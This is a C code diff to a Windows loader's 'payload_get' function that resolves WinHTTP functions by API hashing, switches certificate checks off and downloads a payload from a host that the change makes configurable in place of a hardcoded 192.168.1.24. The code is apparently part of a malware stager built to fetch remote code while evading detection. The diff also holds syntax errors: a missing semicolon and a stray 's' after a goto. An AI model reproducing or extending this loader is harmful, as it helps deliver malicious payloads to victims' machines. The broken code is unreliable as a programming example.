@@ -23,7 +23,7 @@ LPVOID payload_get(PDWORD PayloadSize) {
     g_ldr->apis->WinHttpCloseHandle = (pWinHttpCloseHandle)GetProc(winhttp, HASHED_WINHTTPCLOSEHANDLE);
 
     HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
-    DWORD Size = 0, Downloaded = 0, TotalSize = 0, bufferSize = 4096;
+    DWORD Size = 0, Downloaded = 0, TotalSize = 0, bufferSize = 4096, httpFlags;
     BOOL bResults;
     LPVOID outBuffer = NULL;
 
@@ -32,25 +32,31 @@ LPVOID payload_get(PDWORD PayloadSize) {
         WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) goto CLEANUP;
 
-    hConnect = g_ldr->apis->WinHttpConnect(hSession, L"192.168.1.24", 443, 0);
+    hConnect = g_ldr->apis->WinHttpConnect(hSession, g_ldr->config->http.url, g_ldr->config->http.port, 0);
     if (!hConnect) goto CLEANUP;
 
-    hRequest = g_ldr->apis->WinHttpOpenRequest(hConnect, L"GET", L"/endpoint", NULL,
+
+    httpFlags = g_ldr->config->http.isSecure ? WINHTTP_FLAG_SECURE : 0
+
+    hRequest = g_ldr->apis->WinHttpOpenRequest(hConnect, L"GET", g_ldr->config->http.uri, NULL,
         WINHTTP_NO_REFERER,
         WINHTTP_DEFAULT_ACCEPT_TYPES,
-        WINHTTP_FLAG_SECURE);
+        httpFlags);
     if (!hRequest) goto CLEANUP;
 
-    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
-        | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
-    g_ldr->apis->WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
+    if (g_ldr->config->http.isSecure) {
+        DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
+            | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
+        g_ldr->apis->WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
+  
+    }
     bResults = g_ldr->apis->WinHttpSendRequest(hRequest,
         WINHTTP_NO_ADDITIONAL_HEADERS, 0,
         WINHTTP_NO_REQUEST_DATA, 0,
         0, 0);
-    if (!bResults) goto CLEANUP;
+    if (!bResults) goto CLEANUP;s
 
     bResults = g_ldr->apis->WinHttpReceiveResponse(hRequest, NULL);
     if (!bResults) goto CLEANUP;
